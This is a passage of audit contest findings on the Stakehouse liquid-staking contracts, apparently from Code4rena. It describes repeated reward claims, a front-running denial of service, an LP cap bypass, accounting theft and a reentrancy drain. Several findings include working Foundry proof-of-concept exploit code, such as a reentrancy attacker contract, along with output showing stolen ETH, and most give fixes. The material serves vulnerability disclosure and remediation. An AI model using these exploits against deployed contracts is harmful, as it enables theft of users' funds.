console.log("Claiming rewards for accountOne AGAIN.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log("Claiming rewards for accountOne AGAIN.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        //console.log("Claiming rewards for accountTwo.\n"); +        vm.prank(accountTwo); +        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour)); + +    } + +    function logAccounts() internal { +        console.log("accountOne previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour))); +        console.log("accountOne claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour)))); +        console.log("accountTwo previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour))); +        console.log("accountTwo claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour)))); +        console.log("ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\n", accountOne.balance, accountTwo.balance, address(vault).balance); +    } +  }  ```  Note that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.  Following is an output of the test script showing the balances and differnet state variables: ``` forge test -vv --match testRepetitiveClaim [⠑] Compiling... No files changed, compilation skipped  Running 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest [FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403) Logs:   depositing 1200000000000000000 wei into the vault.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 0   accountTwo previewAccumulatedETH : 600000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000    Claiming rewards for accountOne.    accountOne previewAccumulatedETH : 0   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 600000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000    depositing 1200000000000000000 wei into the vault.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000    Claiming rewards for accountOne.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000    Claiming rewards for accountOne AGAIN.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000    Claiming rewards for accountOne AGAIN.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0   Test result: FAILED. 0 passed; 1 failed; finished in 15.64ms  Failing tests: Encountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest [FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)  Encountered a total of 1 failing tests, 0 tests succeeded  ```  ## Tools Used Manual review / forge test  ## Recommended Mitigation Steps  The `SyndicateRewardsProcessor` contract should be modified as follows: ```diff diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol index 81be706..9b9c502 100644 --- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol +++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol @@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {              // Calculate how much ETH rewards the address is owed / due               uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];              if (due > 0) { -                claimed[_user][_token] = due; +                claimed[_user][_token] += due;                    totalClaimed += due;    ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L882 https://github.com/code-423n4/2022-11-stakehouse/blob/23c3cf65975cada7fd2255a141b359a6b31c2f9c/contracts/syndicate/Syndicate.sol#L22   # Vulnerability details  ## Impact `LiquidStakingManager._autoStakeWithSyndicate` always stakes a fixed amount of 12 ETH. However, `Syndicate.stake` only allows a total staking amount of 12 ETH and reverts otherwise: ```solidity if (_sETHAmount + totalStaked > 12 ether) revert InvalidStakeAmount(); ``` An attacker can abuse this and front-run calls to `mintDerivatives` (which call `_autoStakeWithSyndicate` internally). Because `Syndicate.stake` can be called by everyone, he can stake the minimum amount (1 gwei) such that the `mintDerivatives` call fails.  ## Proof Of Concept As soon as there is a `mintDerivatives` call in the mempool, an attacker (that owns sETH) calls `Syndicate.stake` with an amount of 1 gwei. `_autoStakeWithSyndicate` will still call `Syndicate.stake` with 12 ether. However, `_sETHAmount + totalStaked > 12 ether` will then be true, meaning that the call will revert.  ## Recommended Mitigation Steps Only allow staking through the LiquidStakingManager, i.e. add access control to `Syndicate.stake`.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L469   # Vulnerability details  ## Impact In `registerBLSPublicKeys`, it should be checked (according to the comment and error) if a BLS public key is part of the LSD network and not banned: ```solidity // check if the BLS public key is part of LSD network and is not banned require(isBLSPublicKeyPartOfLSDNetwork(_blsPublicKey) == false, "BLS public key is banned or not a part of LSD network"); ``` However, this is not actually checked. The function `isBLSPublicKeyPartOfLSDNetwork` only checks if the public key is part of the LSD network: ```solidity function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {         return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0); } ``` The function `isBLSPublicKeyBanned` would perform both checks and should be called here: ```solidity function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {         return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0); } ```  Because of that, it is possible to pass banned BLS public keys to `registerBLSPublicKeys` and the call will succeed.  ## Recommended Mitigation Steps Use `isBLSPublicKeyBanned` instead of `isBLSPublicKeyPartOfLSDNetwork`.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L380 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L122 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L130 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L83 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L551 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L940   # Vulnerability details  ## Impact  The user is not able to stake the 32 ETH for validators because the staking fund vault LP total supply exceeds 4 ETHER.  After the smart wallet, staking fund vault and savETH vault has 32 ETH, the user should be able to call:  ```solidity /// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication /// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network) /// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain /// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup /// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature /// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract function stake(  bytes[] calldata _blsPublicKeyOfKnots,  bytes[] calldata _ciphertexts,  bytes[] calldata _aesEncryptorKeys,  IDataStructures.EIP712Signature[] calldata _encryptionSignatures,  bytes32[] calldata _dataRoots ) external { ```  before the staking, the validation function is called:  ```solidity // check minimum balance of smart wallet, dao staking fund vault and savETH vault _assertEtherIsReadyForValidatorStaking(blsPubKey); ```  which calls:  ```solidity /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {  address associatedSmartWallet = smartWalletOfKnot[blsPubKey];  require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");   LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);  require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");  require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");   LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);  require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");  require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault"); } ```  note that the code requires the total supply of the stakingFundsLP to be equal to 4 ETHER  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether"); ```  however, user can call the function rotateLPTokens to mint more than 4 ETHER of the stakingFundsLP because of the incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokens  note that stakingFundVault inherits from ETHPoolFactory.sol  ```solidity contract StakingFundsVault is     Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, ```  so user call rotateLPTokens on StakingFundsVault  ```solidity /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked /// @param _oldLPToken Instance of the old LP token (to be burnt) /// @param _newLPToken Instane of the new LP token (to be minted) /// @param _amount Amount of LP tokens to be rotated/converted from old to new function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {  require(address(_oldLPToken) != address(0), "Zero address");  require(address(_newLPToken) != address(0), "Zero address");  require(_oldLPToken != _newLPToken, "Incorrect rotation to same token");  require(_amount >= MIN_STAKING_AMOUNT, "Amount cannot be zero");  require(_amount <= _oldLPToken.balanceOf(msg.sender), "Not enough balance");  require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, "Liquidity is still fresh");  require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  note the line:  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  the correct implementaton should be:  ```solidity require(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens"); ```  The 24 ETH is hardcoded, but when the stakingFundsVault.sol is init, the maxStakingAmountPerValidator is set to 4 ETH.  ```solidity /// @dev Initialization logic function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {  require(address(_liquidStakingNetworkManager) != address(0), "Zero Address");  require(address(_lpTokenFactory) != address(0), "Zero Address");   liquidStakingNetworkManager = _liquidStakingNetworkManager;  lpTokenFactory = _lpTokenFactory;   baseLPTokenName = "ETHLPToken_";  baseLPTokenSymbol = "ETHLP_";  maxStakingAmountPerValidator = 4 ether; } ```  note the line:  ```solidity maxStakingAmountPerValidator = 4 ether; ```  this parameter maxStakingAmountPerValidator restrict user's ETH deposit amount  ```solidity     /// @dev Internal business logic for processing staking deposits for single or batch deposits function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {  require(_amount >= MIN_STAKING_AMOUNT, "Min amount not reached");  require(_blsPublicKeyOfKnot.length == 48, "Invalid BLS public key");   // LP token issued for the KNOT  // will be zero for a new KNOT because the mapping doesn't exist  LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];  if(address(lpToken) != address(0)) {   // KNOT and it's LP token is already registered   // mint the respective LP tokens for the user    // total supply after minting the LP token must not exceed maximum staking amount per validator   require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");    // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied   lpToken.mint(msg.sender, _amount);   emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);  }  else {   // check that amount doesn't exceed max staking amount per validator   require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");   ```  note the line:  ```solidity require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");  ```  However, such restriction when rotating LP is changed to  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  **so to sum it up:**  When user stakes, the code strictly requires the stakingFundVault LP total supply is equal to 4 ETH:  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether"); ```  However, when rotating the LP, the maxStakingAmountPerValidator for staking fund LP becomes 24 ETH, which exceeds 4 ETH (the expected maxStakingAmountPerValidator)  ## Proof of Concept  First we need to add the import in LiquidStakingManager.t.sol  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol";  import "../../contracts/liquid-staking/StakingFundsVault.sol"; import "../../contracts/liquid-staking/LPToken.sol"; ```  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  **then we add the POC:**  ```solidity function test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() public {   address user = vm.addr(21312);   bytes memory blsPubKeyOne = fromHex("94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");  bytes memory blsPubKeyTwo = fromHex("9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");   bytes[] memory publicKeys = new bytes[](2);  publicKeys[0] = blsPubKeyOne;  publicKeys[1] = blsPubKeyTwo;   bytes[] memory signature = new bytes[](2);  signature[0] = "signature";  signature[1] = "signature";   // user spends 8 ether and register two keys to become the public operator  vm.prank(user);  vm.deal(user, 8 ether);  manager.registerBLSPublicKeys{value: 8 ether}(   publicKeys,   signature,   user  );   // active two keys  MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);  MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 1);   // deposit 4 ETH for public key one and public key two  StakingFundsVault stakingFundsVault = manager.stakingFundsVault();  stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyOne, 4 ether);  stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyTwo, 4 ether);   // to bypass the error: "Liquidity is still fresh"  vm.warp(1 days);   // rotate staking amount from public key one to public key two  // LP total supply for public key two exceed 4 ETHER  LPToken LPTokenForPubKeyOne = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);  LPToken LPTokenForPubKeyTwo = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyTwo);  stakingFundsVault.rotateLPTokens(LPTokenForPubKeyOne, LPTokenForPubKeyTwo, 4 ether);   uint256 totalSupply = LPTokenForPubKeyTwo.totalSupply();  console.log("total supply of the Staking fund LP exists 4 ETHER.");  console.log(totalSupply);   // calling TestUtils.sol#stakeSingleBlsPubKey, revert  stakeSingleBlsPubKey(blsPubKeyTwo);  } ```  We run the POC:  ```solidity forge test -vv --match test_rotateLP_Exceed_maxStakingAmountPerValidator_POC ```  the output is:  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454) Logs:   total supply of the Staking fund LP exists 4 ETHER.   8000000000000000000  Test result: FAILED. 0 passed; 1 failed; finished in 15.73ms  Failing tests: Encountered 1 failing test in test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454) ```  the total supply of the LP exceeds 4 ETH and the transaction precisely reverts in:  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether"); ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  We recommend the project change from  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  to  ```solidity require(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens"); ```  and change from  ```solidity /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {  address associatedSmartWallet = smartWalletOfKnot[blsPubKey];  require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");   LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);  require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");  require(stakingFundsLP.totalSupply() >= 4 ether, "DAO staking funds vault balance must be at least 4 ether");   LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);  require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");  require(savETHVaultLP.totalSupply() >= 24 ether, "KNOT must have 24 ETH in savETH vault"); } ```  we change from == balance check to >=, because == balance check is too strict in this case.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90   # Vulnerability details  ## Impact  The contract GiantMevAndFeesPool override the function totalRewardsReceived: ``` return address(this).balance + totalClaimed - idleETH; ``` The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP` ``` uint256 received = totalRewardsReceived(); uint256 unprocessed = received - totalETHSeen; ``` But it will decrease the `idleETH` first and then burn the lpTokenETH in the function `GiantMevAndFeesPool.withdrawETH`. The lpTokenETH burn option will trigger `GiantMevAndFeesPool.beforeTokenTransfer` which will call _updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.  ## Proof of Concept I wrote a test file for proof, but there is another bug/vulnerability which will make the `GiantMevAndFeesPool.withdrawETH` function break down. I submitted it as the other finding named "GiantLP with a transferHookProcessor cant be burned, users' funds will be stuck in the Giant Pool". You should fix it first by modifying the code https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166 to : ``` if (_to != address(0)) {     _distributeETHRewardsToUserForToken(         _to,         address(lpTokenETH),         lpTokenETH.balanceOf(_to),         _to     ); } ``` I know modifying the project source code is controversial. Please believe me it's a bug needed to be fixed and it's independent of the current vulnerability.  test: test/foundry/TakeFromGiantPools2.t.sol ``` pragma solidity ^0.8.13;  // SPDX-License-Identifier: MIT  import "forge-std/console.sol"; import {GiantPoolTests} from "./GiantPools.t.sol";  contract TakeFromGiantPools2 is GiantPoolTests {     function testDWUpdateRate2() public{         address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);         address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);         // Deposit ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();         vm.startPrank(feesAndMevUserTwo);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         giantFeesAndMevPool.withdrawETH(4 ether);         vm.stopPrank();         console.log("user one:", getBalance(feesAndMevUserOne));         console.log("user two(attacker):", getBalance(feesAndMevUserTwo));         console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));     }      function getBalance(address addr) internal returns (uint){         // just ETH         return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);     }  } ``` run test: ``` forge test --match-test testDWUpdateRate2 -vvv ```  test log: ``` Logs:   user one: 0   user two(attacker): 6000000000000000000   giantFeesAndMevPool: 2000000000000000000 ```  The attacker stole 2 eth from the pool.  ## Tools Used foundry  ## Recommended Mitigation Steps `idleETH -= _amount;` should be after the `lpTokenETH.burn`.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158   # Vulnerability details  ## Impact withdrawUnusedETHToGiantPool will withdraw any eth from the vault if staking has not commenced(knot status is INITIALS_REGISTERED), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.   ## Proof of Concept place poc in GiantPools.t.sol with `import { MockStakingFundsVault } from "../../contracts/testing/liquid-staking/MockStakingFundsVault.sol";`   ```solidity     function testStuckFundsInGiantMEV() public {          stakingFundsVault = MockStakingFundsVault(payable(manager.stakingFundsVault()));         address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);         //address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         //address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);         address victim = accountFour; vm.deal(victim, 1 ether);           registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          emit log_address(address(giantFeesAndMevPool));         vm.startPrank(victim);          emit log_uint(victim.balance);         giantFeesAndMevPool.depositETH{value: 1 ether}(1 ether);         bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(1 ether);         giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);          emit log_uint(victim.balance);           vm.warp(block.timestamp + 60 minutes);         LPToken lp = (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));         LPToken [][] memory lpToken = new LPToken[][](1);         LPToken[] memory temp  = new LPToken[](1);         temp[0] = lp;         lpToken[0] = temp;          emit log_uint(address(giantFeesAndMevPool).balance);         giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken, stakeAmountsForVaults);          emit log_uint(address(giantFeesAndMevPool).balance);         vm.expectRevert();         giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);          vm.expectRevert();         giantSavETHPool.withdrawETH(1 ether);          vm.stopPrank();     }   ```  both withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH  Note that the same problem also exists in GiantSavETHVaultPool, however a poc cannot be done for it as another bug exist in GiantSavETHVaultPool which prevents it from receiving funds as it lacks a receive() or fallback() implementation.  ## Tools Used  Foundry  ## Recommended Mitigation Steps update `idleETH`  in withdrawUnusedETHToGiantPool
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347   # Vulnerability details  ## Impact  Reentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet  ## Proof of Concept  the code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.  ```solidity     /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.     /// @dev A banned node runner cannot withdraw ETH for the KNOT.      /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn     function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {         require(_recipient != address(0), "Zero address");         require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key has already withdrawn or not a part of LSD network");          address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];         require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, "Not the node runner for the smart wallet ");         require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, "Node runner is banned from LSD network");         require(associatedSmartWallet.balance >= 4 ether, "Insufficient balance");         require(             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,             "Initials not registered"         );          // refund 4 ether from smart wallet to node runner's EOA         IOwnableSmartWallet(associatedSmartWallet).rawExecute(             _recipient,             "",             4 ether         );          // update the mapping         bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;          emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);     } ```  note the section:  ```solidity // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether );  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet; ```  if the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.  As shown in our running POC.  We need to add the import first:   ```solidity import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol"; ```  We can add the smart contract below:  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity interface IManager {     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable;     function withdrawETHForKnot(         address _recipient,          bytes calldata _blsPublicKeyOfKnot     ) external; }  contract NonEOARepresentative {      address manager;     bool state;      constructor(address _manager) payable {          bytes[] memory publicKeys = new bytes[](2);         publicKeys[0] = "publicKeys1";         publicKeys[1] = "publicKeys2";          bytes[] memory signature = new bytes[](2);         signature[0] = "signature1";         signature[1] = "signature2";          IManager(_manager).registerBLSPublicKeys{value: 8 ether}(             publicKeys,             signature,             address(this)         );          manager = _manager;      }      function withdraw(bytes calldata _blsPublicKeyOfKnot) external {         IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);     }      receive() external payable {         if(!state) {             state = true;             this.withdraw("publicKeys1");         }     }  } ```  there is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.  We add the test case.  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  ```solidity function testBypassIsContractCheck_POC() public {   NonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));  address wallet = manager.smartWalletOfNodeRunner(address(pass));  address reprenstative = manager.smartWalletRepresentative(wallet);  console.log("smart contract registered as a EOA representative");  console.log(address(reprenstative) == address(pass));   // to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED  MockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1", 1);   // expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER  pass.withdraw("publicKeys1");  console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");  console.log(address(pass).balance);  } ```  we run the test:  ```solidity forge test -vv --match testWithdraw_Reentrancy_POC ```  and the result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testWithdraw_Reentrancy_POC() (gas: 578021) Logs:   smart contract registered as a EOA representative   true   balance after the withdraw, expected 4 ETH, but has 8 ETH   8000000000000000000  Test result: ok. 1 passed; 0 failed; finished in 14.85ms ```  the function call is   pass.withdraw("publicKeys1"), which calls  ```solidity function withdraw(bytes calldata _blsPublicKeyOfKnot) external {  IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot); } ```  which trigger:  ```solidity // refund 4 ether from smart wallet to node runner's EOA 